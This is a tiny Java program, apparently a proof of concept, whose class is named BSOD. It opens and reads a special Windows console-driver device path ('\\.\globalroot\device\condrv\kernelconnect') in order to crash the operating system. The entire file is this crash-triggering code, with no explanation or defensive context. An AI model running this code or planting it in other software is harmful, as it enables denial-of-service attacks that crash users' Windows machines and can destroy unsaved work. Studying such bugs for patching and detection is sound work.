import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

public class BSOD {
	public static void main(String[] args) throws FileNotFoundException, IOException {
		try (FileReader fr = new FileReader(new File("\\\\.\\globalroot\\device\\condrv\\kernelconnect"))) {
			fr.read();
		}
	}
}